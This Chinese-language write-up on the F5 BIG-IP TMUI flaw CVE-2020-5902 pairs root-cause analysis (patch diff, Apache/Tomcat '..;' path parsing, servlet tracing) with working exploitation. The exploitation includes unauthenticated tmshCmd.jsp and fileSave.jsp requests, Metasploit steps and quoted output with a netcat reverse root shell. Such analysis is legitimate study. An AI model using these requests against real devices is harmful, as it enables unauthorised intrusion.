![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHB2HH68QoGiahylgQXWTyxCialyvaLxhqNdaj4N5weoB1qdpqHRR0ZlfQ/640?wx_fmt=png "")  

```
GET/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/1.txt HTTP/1.1
Host: 192.168.174.214
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=3DD313DBE2953C844A648AF0EF8BCE1F




```

  
成功反弹shell：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHZRnxiaFlZ65t4uzagicLteAKmr9ibbee2dgibE3BuRo8khQboiaDyDt0J1A/640?wx_fmt=jpeg "")  
  
c、python反弹shell回来  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHltCPewuNdicJGAJ9gQ2jO4abEzSECFfemfVWgTdPHAjDQAFm9ZDDOzA/640?wx_fmt=png "")  

```
GET/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/1.txt HTTP/1.1
Host: 192.168.174.214
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=3DD313DBE2953C844A648AF0EF8BCE1F


```

  
![](https://mmbiz.qpic.cn/mmbiz_jpg/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHdMu398xRib6u0WUjeXkUUFsYCRhN29XSANkaTaWd3eibI2Hia4GSEAeQw/640?wx_fmt=jpeg "")  
  
Step 4：清除创建的alias  

```
tmshCmd.jsp?command=delete+cli+alias+private+list
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuH9Vhjibic7IY57CUBu7aA7Hhic0AVKnc9DaRpZHf9jSy4qTXg50XWJ0oIA/640?wx_fmt=png "")  

```
GET/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list HTTP/1.1
Host: 192.168.174.214
Connection: close
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=3DD313DBE2953C844A648AF0EF8BCE1F


```

###### 文件上传  
  
POC:  

```
POST:/tmui/locallb/workspace/fileSave.jsp
fileName=/tmp/1.txt&content=CVE-2020-5902
```

  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHz55E1vQHKjKdK2pJRiagrOuP1Gc1UaU6xy9DjsqCy9Y4D795cK5FufA/640?wx_fmt=png "")  
  
之后通过文件读取验证：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuH9hjJso8PBDyw7DJRx4XiaDA12Fqcj8RS3603d9jh7Cmhahsq8yleFkQ/640?wx_fmt=png "")  
  
可以看到成功上传文件/tmp/1.txt~  
  
PS：这里的文件写入路径可控，所以可以写入到计划任务或者www下的可写路径下(路径下有部分无法写入)，这里不再展开赘述了~  
##### MSF利用  
  
首先，我们需要下载MSF官方提供的攻击载荷到本地，在这之前你需要了解自己的msf的modules的路径，笔者这里为：/opt/metasploit-framework/embedded/framework/modules/exploits/linux/http/  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHxZZiczmz16kLicbC4iaBiaVXFVkEo2w45X1HjakYyBTkwPSCyibEicr7FjgA/640?wx_fmt=png "")  
  
之后下载攻击载荷到本地（需要科学上网，也可以直接下载文件复制到对应的目录）：  

```
wget -P /opt/metasploit-framework/embedded/framework/modules/exploits/linux/http/ https://raw.githubusercontent.com/rapid7/metasploit-framework/0417e88ff24bf05b8874c953bd91600f10186ba4/modules/exploits/linux/http/f5_bigip_tmui_rce.rb
```

  
![](https://mmbiz.qpic.cn/mmbiz_jpg/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHLeDEH9H5VOsEuJ2UQqCu6DIGNCX5VP9a1USj9vWKvZS1kayOyW81GA/640?wx_fmt=jpeg "")  
  
之后启动MSF并通过'reload_all'指令来重新加载MSF的modules，之后  
搜索f5_bigip你会看到可用的载荷信息：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHLfZwE94xLJKkHogV7ZroiaokFqWXxUU0c6WaKqjrxyM5JqPO3xKbuOw/640?wx_fmt=jpeg "")  
  
下面以192.168.174.214为例做一次利用演示，首先设置相关的配置项参数：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHPzbicBxb39MLyQlXJ75qibuDLKaibJwyFQxZsFttLV1ic94LsmqX6jV8AQ/640?wx_fmt=jpeg "")  
  
之后执行，很可惜，失败了，不知道是个人的环境原因还是什么问题(之前升级更新过msf)，后续查看过msf攻击脚本，感觉与环境依赖问题没多大关系，target也切换过UNix与Linux，但是也不行，之后也尝试过用admin用户先登录，结果依旧不行，不过，此路不通还有其他道路，使用python也挺好的~  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHMV5y70sRTSwJs5ViaxdfKBtjqBN9jMGjTpGSw7iaW5kyibMuYt66ELeyQ/640?wx_fmt=jpeg "")  
  
下面网上有关成功的人给出的执行结果：  

```
msf5 exploit(linux/http/f5_bigip_tmui_rce) > run


[+] nc 172.16.249.1 4444 -e /bin/sh
[*] Started reverse TCP handler on 172.16.249.1:4444
[*] Executing automatic check (disable AutoCheck to override)
[+] The target is vulnerable. Target is running BIG-IP 14.1.2.
[*] Creating alias list=bash
[+] Successfully created alias list=bash
[*] Executing Unix Command for cmd/unix/reverse_netcat_gaping
[*] Executing command: nc 172.16.249.14444 -e /bin/sh
[*] Uploading /tmp/lxoQO9DPOSpDiF8rP5yNfc4dVo67qsckbdaNc3ES3
[+] Successfully uploaded /tmp/lxoQO9DPOSpDiF8rP5yNfc4dVo67qsckbdaNc3ES3
[*] Executing /tmp/lxoQO9DPOSpDiF8rP5yNfc4dVo67qsckbdaNc3ES3
[*] Command shell session 1 opened (172.16.249.1:4444 -> 172.16.249.176:44736) at 2020-07-0618:05:24-0500
[+] Deleted /tmp/lxoQO9DPOSpDiF8rP5yNfc4dVo67qsckbdaNc3ES3
[*] Deleting alias list=bash
[+] Successfully deleted alias list=bash


id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0
uname -a
Linux localhost.localdomain 3.10.0-514.26.2.el7.ve.x86_64 #1 SMP Wed Aug 7 08:16:38 PDT 2019 x86_64 x86_64 x86_64 GNU/Linux
```

  
Nmap检测  
  
  
脚本地址：  
  
https://raw.githubusercontent.com/RootUp/PersonalStuff/master/http-vuln-cve2020-5902.nse  
  
下载以上脚本，并将其放置到nmap的scrip目录下，我这里是：/usr/share/nmap/scripts/  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHfe1Osb1vero8gSuFVh8iar2hmaSsF0DEF8mPT3HHAKYcWcIbKILSvBA/640?wx_fmt=png "")  
  
  
之后使用nmap进行检测：  

```
nmap--scripthttp-vuln-cve2020-5902-p 443 192.168.174.214
```

  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHujvnSicptiaGHFiaqMqL1H7VXicVfeNNp6xPQPPO3a4qPp1WqzAOk8oPHw/640?wx_fmt=jpeg "")  
  
  
从上面可以看出这里主要使用的文件读取来进行验证漏洞是否存在的~  
#### 漏洞分析  
##### 源码对比  
  
目前，关于该漏洞的EXP/POC满天飞，而且官方已给出安全建议以及发布最新的升级包，下面我们先来分析查看一下整个程序在修复前后有什么变化，在这里我们通过SSH连接下载到本地的存在漏洞的靶机与不存在漏洞的靶机中的/usr/local/www/tmui文件夹到本地，分别命名为tmui1与tmui2：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuH6OeNa5LVDrYPcPqXMVpy4V8gib0ZVfibFib9wCrJMpeyicpt1tcuHkXjWg/640?wx_fmt=png "")  
  
之后，我们使用文件对比分析工具Beyond Compare对两个文件夹做比较分析，通过对比我们可以看到其中文件夹framework、policsync以及文件uris.xml大小都没有发生变化，之后缩小范围到tmui文件夹和WEB-INF文件夹内：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuH24j56XwicwmGpoeAWUTmtLqZKmdSszLmzDBVSahWaNr9PKbYAm2zXeA/640?wx_fmt=png "")  
  
从上面我们可以很直观的看到web.xml文件发生了变化，关于该文件的作用以及配置项可以自我百度，通过查找对比发现的点有以下几个：  
  
1、左侧的漏洞文件中的Servlet类"org.hsqldb.Servlet"被删除了————可能与该漏洞有关，也许是存在漏洞的关键类  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHdWSJ8iaXm34SOvGrliaQWOesMqKib5wfgclgyPrf7ibfIjvtPyWFjxZgYg/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHnaHVicRQqCSgAu1rqVUTf5ZaZLTUlJHPWTjlRibkg2ejcAjN6yUezwVA/640?wx_fmt=png "")  
  
2、Servlet的名称、Servlet类名称的变更和S  
ervlet所对应的URL的变更————这与文件更新有关，暂无关键发现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHqaFDqPY9GHTpctjqeYELAibM9XJJx5oyiamDdnPmF29urrGg8Bv9IpfQ/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHelFicGjkBs6jGVbH5icdVpg4ClY3PZVn8gmibZZVUpWQGRGygLFK6OQTQ/640?wx_fmt=png "")  
  
下面再来看看WEB-INF中的关键变化：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHmnKWdU2UPrFOcUiaQluw5357lNVJvV1FxdVExbSBriaqFWfsshFqmEKA/640?wx_fmt=png "")  
  
主要是增加了一个http3与quic,别无其他：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuH7CUqZAk4w1gpiaibiadOySEC73EoNofAFgmDIbgNCSmvBYjkcRWx5EZyg/640?wx_fmt=png "")  
  
而tmui文件夹并无任何可疑发现~  
##### 修复建议  
  
时至今日，官方给出的建议已经更新了三次：  
  
第一次：  
修改的关键信息如下所示，方案的本质是在httpd的配置中增加了下面的规则，即当http服务器在检测到URL中包含..;的时候直接重定向到404，  
  
由此可以得知在路由解析方面应该存在问题，且必然与..;相关  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuH3hRAH0ZQhR2nRd1qz2AEgp0nF2flddbZRykTgcUkPXOKqhfQjiaQV4Q/640?wx_fmt=png "")  
  
  
第二次：  
在第一次的基础上更改了匹配规则，当HTTP服务器在检测到URL中包含；的时候，直接重定向到404页面，感觉这是一种对于第一种的绕过，也可能是攻击者发现了"新大陆"：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHm98ibibgBDKrjscO6q2IrV5aR8YPOzN0ELbwKAXXpzkZFoyicbia3UIdFg/640?wx_fmt=png "")  
  
第三次：  
在第二次的基础上增加了hsqldb的匹配规则，而hsyqldb在进行源码差异对比时也发现已经从最新版本中移除了，这一定根据确信的说明了该漏洞的产生与hsqldb相关：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHS1BofI5PWFcX2Q5DI8XHTEp4lozMFibUHShia3lotgP3FibjYH5mmiaWVA/640?wx_fmt=png "")  
  
从上面我们可以得到以下几点：  
  
1、该漏洞与URL中的..;相关，而应用程序为一个JAVA应用，请求经由Tomcat进行处理分发，而这自然就涉及到了Tomcat对于URL的解析特性了，很大程度上应该和这有关系(具体可参考https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf)  
  
2、官方给出的安全建议进行了第二次更新，在更新中修改了匹配规则，将原来的针对类似于"..;"的匹配更改成了直接匹配";"，而这也许是第一种的一种绕过，也许是问题的关键在于";"  
  
3、官方在继第二次更新安全建议之后又做了第三次更新，其中增加了对hsqldb的正则匹配，这也说明该漏洞很大程度上跟hsqldb相关，值的留意。  
##### EXP分析  
  
这里以GitHub上最早给出的Python利用EXP为例做分析：https://github.com/jas502n/CVE-2020-5902  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHstL9iadcymW2gyuXmia57pcprv8exibPfw6El1RwkOFrFb1aLzJr1rcuQ/640?wx_fmt=png "")  
  
在该EXP中，定义了四个功能函数，我们来看一下到底实现了什么功能，以及有哪些关于漏洞的信息时可以白捡一波的，我们首先进入入口main中进行分析，可以看到这里定义了基础URL(即Server的域名或ip地址)，之后接受来自客户端的命令并传值给cmd，之后调用tmshCmd_exit函数：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuH4CXKbicQJf5f1dsaH7PHz8x3tGFrJic9kpkYj7kcAIL95osn8L6JoLWw/640?wx_fmt=png "")  
  
下面我们跟进tmshCmd_exit查看一下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHlZBc1A9OrrGBWFWqQhIYKmFSXYdkzwBoRZ1wU8tqLtW1MYDAjpNT4Q/640?wx_fmt=png "")  
  
如上图所示，其中在漏洞URL处可以明确的看到"..;"的存在，关于这一点不再赘述，可以参考之前给的Tomcat下URL解析特性来了解，而从上面我们也可以看到这里存在漏洞的漏洞文件位置应该为：/tmui/tmui/locallb/workspace/tmshCmd.jsp，这也是我们后续IDEA进行分析时要特别关注留意的点，而且这里的参数根据语义可以知晓应该是待执行的命令，这条命令主要是为bash设置了一个别名list，可以看到当命令执行成功，返回200的响应同时'tmui'在响应中时，则将url、file、cmd作为参数传入upload_exit()函数，下面我们继续跟进  
upload_exit：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuH7wsibmWNHKbI4j0iaXYMLd1lPl7mcpTflA5j7GyHIbGtact8So5fqRmg/640?wx_fmt=png "")  
  
如上图所示，在  
upload_exit中重新定义了漏洞URL，此时跟进文件名应该是进行一次文件保存，文件名由传入的file指定，内容由cmd指定，同时在这里也确定了存在文件上传的漏洞文件为：/tmui/tmui/locallb/workspace/fileSave.jsp，同样，这里也会后期去调用list_command函数，我们继续跟进：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHkrVtXm1ZIHv5vjtvUptssPs7oaialclITbicTqk5rPntQ7xfceGcNCeA/640?wx_fmt=png "")  
  
如上图所示，可以看到这里指定了RCE的路径，从这里可以看到我们传递的指令最终会在/tmui/tmui/locallb/workspace/tmshCmd.jsp文件中被执行，同时这里可以看到使用了list来执行命令，那么为什么不直接使用bash来执行命令呢？还要在第一步为bash设置一个list的别名，感觉有点多此一举(其实，这里并不是多此一举，后续代码分析中进行解释，目前我们还时一个分析者的角度继续分析，来剖析漏洞的原理)，这是一个值得思考的问题，而这里的操作说白了就是执行之前写入 文件的指令，之后打印输出，同时这里执行成功之后也会去调用delete_list函数，我们继续跟进去看看：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHaRQsZVk5CaWDQ4TmJWgILyRxPWTJeSXiafoOxySDxKGlWOY4Y5mtBZQ/640?wx_fmt=png "")  
  
可以看到，以上的操作主要是用于删除我们之前为bash所设置的别名——list，至于这是为什么，这里有两种猜想(站在分析者角度)：  
1. 清理痕迹，删除通过alias定义的别名  
  
1. list具有特殊含义，为了不影响程序正常执行需要将其还原  
  
至此，整个流程走完，之后进入一个while(1)的循环，可以说这里主要是：  
1. 创建bash的别名list，用list来执行命令  
  
1. 创建文件，并在其中写入要执行的命令  
  
1. 通过list来执行文件中的命令  
  
1. 清除bash的别名list  
  
##### 简易整理  
  
通过上面的分析我们主要得到下面几点信息：  
  
1、漏洞与hsqldb相关  
  
2、漏洞涉及Tomcat对URL解析的特性  
  
3、已确定漏洞文件的位置，以及相关的参数和一个实现RCE的基本操作流程  
  
上面的都是为后面的IDEA分析做类似于"情报收集"的，而下面的IDEA也正是漏洞原理剖析的重点~  
##### IDEA分析  
  
造成该漏洞的原因主要是Tomcat对于含有特殊符号的URL解析特性导致的权限校验绕过，之后通过未授权访问相关路由信息导致的文件读取、文件写入以及tmsh命令执行等，下面我们从三个方面来看：中间件的URL解析差异性、请求处理追溯、后端代码逻辑  
###### 解析差异简介  
  
在WEB架构服务中，我们经常会碰到Tomcat与Nginx，Apache这三个服务，我们在这里首先做一个区别：  
- Apache：HTTP服务器是一个模块化的服务器，可以运行在几乎所有广泛使用的计算机平台上，其属于应用服务器。Apache本身是静态解析，适合静态HTML、图片等，但可以通过扩展脚本、模块等支持动态页面等，(Apche可以支持PHP，cgi(外部应用程序与Web服务器之间的接口)、perl，但是要使用Java的话，你需要Tomcat在Apache后台支撑，将Java请求由Apache转发给Tomcat处理。  
  
- Tomcat：Tomcat是应用(Java)服务器，它只是一个Servlet(JSP也翻译成Servlet)容器，可以认为是Apache的扩展，但是可以独立于Apache运行。  
  
- Nginx：Nginx是一个高性能的HTTP和反向代理服务器，同时也是一个IMAP/POP3/SMTP  
  
F5 BIG-IP采用的为Apache+Tomcat组合来处理JAVA应用，下面我们进入正式的话题！在这里我们以Orange在2018年的BlackHat的演讲文档中的一个类似的实例做介绍说明，在正常情况下我们访问login.getbynder.com时会要求我们先进行一次登录认证：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHNsDOtMib42Rfu3z98eGOVQibM3DicyicGDwZsP9SF7teQksLbetnHkZQ3Q/640?wx_fmt=jpeg "")  
  
  
此时的服务器端的响应结果类似下图所示：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHZUUHtznibheueQKStNhu7icCWfrkJVar5NMYNhLGnaCFrPFTmiaNZxP3g/640?wx_fmt=png "")  
  
之后，我们通过在域名后直接添加"..;/x"并进行访问得到如下结果：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHXv4ZhkUfGYJiachY5gl24w6AWDu9dsvpv2dSQ0CNR12ShL31kbNXDcA/640?wx_fmt=png "")  
  
在fuzz过程中用到一下测试示例：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHV54ofibGtUr4lp9fJ6NZ2QfvZ6Hm341x4gs3uTF5BPUueENYOoXhjmA/640?wx_fmt=png "")  
  
那么为什么会出现这种问题呢？是因为当Nginx以及Apache碰到"/..;/"时，他们会认为"/..;/"是一个目录，而Tomcat则很是无耐的表示"/..;/"应该是一个父级目录，需要向上递归一次：  
  
Nginx VS Tomcat:  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHoq7WfNa2Gp7MaoaHNVP8uhePVLCRKSewkDQPcFneAANCZAkGyUsibZQ/640?wx_fmt=jpeg "")  
  
Apache VS Tomcat：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHcUIz5nGibLC54iczMmVR8iba6uvtNr8WJWVkauAq4eicDZPqUC57hicdETQ/640?wx_fmt=jpeg "")  
  
  
在这里我们可以利用以上解析特性来绕过权限检测访问需要登录后才可以访问页面：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHWeAlKEDZoqVxao3zNAKPxiaBYv0HTCNRUoDIOf6YXMqJvicaeK4iatG5A/640?wx_fmt=jpeg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHpGXzqlqwUJ9urrWXPhNicibRJY7foDqDPpaWuq0aaN3NWAgqc24UL58Q/640?wx_fmt=jpeg "")  
  
  
其他的中间件解析差异对比效果如下  
  
请求URL:https://www.example.com/foo;name=orange/bar/  
  
解析对比：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHjcGib2fkQu7CERhFYicJPForX8wicS0ZRI8Y4YQj3yDeLZA0hAPLsib1Fg/640?wx_fmt=png "")  
  
  
回到我们的漏洞中，这里我们可以理解在F5 BIG-IP的后台服务器对收到了URL请求进行了两次的解析，第一次是httpd(Apache), 第二次是后一层的Java(tomcat)，当我们发起请求：https://server/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash时，此时在URL在第一次被Apache解析时，Apache关注的是URL的前半段：  
  
https://server/tmui/login.jsp/  
..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash  
  
当Apache在看见前半段是合法URL且是允许被访问的页面时，就把它交给了后面的第二层，Apache在这里完全把URL里面关键的/..;/ 给无视了，此时做权限校验的只是前面的login.jsp而已~  
  
在URL在第二次被解析时，后面的Java(tomcat)会把"/..;/"理解为向上返回一层路径，此时,，/login.jsp/ 和 /..;/ 会抵消掉，Tomcat看到的真正请求从  
  
https://server/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash  
  
变成了：  
  
https://server/tmui/  
t  
mui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash  
  
之后去根据web.xml中的路由调用对应的类进行请求处理，关于解析差异性的更多细节与利用技巧可参考如下链接(值的细品)：  
  
https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf  
###### 请求处理追溯  
  
首先我们从Web的配置文件/WEB-INF/web.xml看起，在这里我可以看到配置的Servlet的load-on-startup属性，该属性的含义是在服务器启动的时候就加载这个servlet(实例化并调用init()方法)，在这个属性中的可选内容必须为一个整数，表明了这个servlet被加载的先后顺序，当是一个负数时或者没有指定时，则表示服务器在该servlet被调用时才加载。当值为0或者大于0时，表示服务器在启动时就加载这个servlet，容器可以保证被标记为更小的整数的servlet比被标记为更大的整数的servlet更先被调用，还可以选择同样的load-on-start-up值来夹在servlets。  
  
在这里我们留意到首先是加载com.f5.controller.Log4jInit类，该类的主要作用是配置log日志的记录，我们继续向下看：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHg1nibXwo068aQzpteakQZ9tLXXibvvjAQiazq5u4C3TrWTHEiaQEVGiciaRQ/640?wx_fmt=jpeg "")  
  
之后我们发现了  
com.f5.controller.ControlServlet类同样配置了  
load-on-start-up属性，并指定了  
init()方法的参数信息：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHXAzbxNmV2l0ibf9tZpRJCFLYicloN9ku1VGD4vy5ncz0KVYtrUHic8fmA/640?wx_fmt=jpeg "")  
  
之后，我们使用jd-gui分析依赖/WEB-INF/lib/tmui.jar，根据目录项依次找到 com.f5.controller.ControlServlet的init方法：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHqBbs22tqnbTaAzFzb777cf8cVbHTT8z851AoM4mE4DxqzO4FCt6dBQ/640?wx_fmt=png "")  
  
可以看到此处的init()方法首先是初始化了一些配置项，并根据配置项参数做相应的配置操作，在最后我们可以看到又调用了F5Controller类  
的init方法，并以之前的初始化值作为参数传递，我们继续跟进该Servlet类：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHh50O6zHgBbVoP3QpDABaxeJC5XcyaAgl8aYMiao2CMpBsKHdjVJib1iaA/640?wx_fmt=png "")  
  
从上图中可以看到，这里只是做了一些简单的初赋值操作，我们返回原先的  
ControlServlet类，之后可以看到调用了F5WeebController类的initMapping方法：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHTiayG2G46EWYKhIzqsVF1Cea4ib9KouPo4KpxuJZE6q9kJPrMmBlkXSA/640?wx_fmt=png "")  
  
之后跟进该类的intitleMapping方法，可以看到此处有转而调用了Mapping方法：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuH3p9mzLJUSKYkfNQoGUVibGgic43lMnCWJCHrqpHLI34j4FtDR3gMl4Fw/640?wx_fmt=png "")  
  
之后继续跟进，可以看到在该方法中分别读取了/WEB-INF/xml/requestmappings.xml、/WEB-INF/xml/responsemappings.xml：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHOdV8iaz5T6qTyXico2nIMJQyCO6Mg2FUFZYmfAVLqzXHh6ibfxolK6Igw/640?wx_fmt=png "")  
  
/WEB-INF/xml/requestmappings.xml————请求地址handler映射(对应处理类方法)：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHIBTmB5pDUbxjAJ2wd2k3wYZlRIGxZDWeN0wtEWDnyaCvAcj4bLKR2w/640?wx_fmt=jpeg "")  
  
/WEB-INF/xml/  
responsemappings  
.xml————响应地址handler映射(对应jsp文件)：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuH20oW1WzDicItPKWrmibrAjw0OE21gAhA4dyCETYEWeDepI3ov76OaAVQ/640?wx_fmt=jpeg "")  
  
之后继续返回com.f5.controller.ControlServlet，可以看到该类重新doGet方法与doPost方法，所以的请求都会经由这两种方法进行处理：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHF1BCyU6X9Vk2gIDu0Z2aKtqWJAXpPVDxTRK2CYxGWfmS7Tzb9Rsiczg/640?wx_fmt=png "")  
  
而doPOST中直接转发请求到了doGet内：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuH5K9kfefkUqc79f2YkpmdvqAneUYRiciaf813mfjVkBzN2doYG4sbF26Q/640?wx_fmt=png "")  
  
所以我们这里直接对doGet做一个简单的分析即可  
;  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHzoGMYZicexGzRZK3wSRxLQnSDF2BjLlibtIebjX60CXOCK5N6SRwZDRw/640?wx_fmt=png "")  
  
在这里可以看到首先是判断请求的处理是否能够提供分配数据库的连接，如果连接方式是1则连接mysql，如果连接方式是0则连接hsqldb，注意的是这里出现了之前在文件比对中出现的差异性——"修复版本"删除了"hsqldb"数据库。  
  
之后我们继续向下分析，此时会实例化一个F5WebController类对象，并且将request等参数传递进去，之后跟进去发现除实例化操作外别无其他：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUickksDia6CZqHmTcNL0BMNfuHPv86jYOEwYsGkdXxqELV7ibH8hQ43yYOgSgJ5AiboVibQ7ZfH6BibGHc2g/640?wx_fmt=png "")  
  
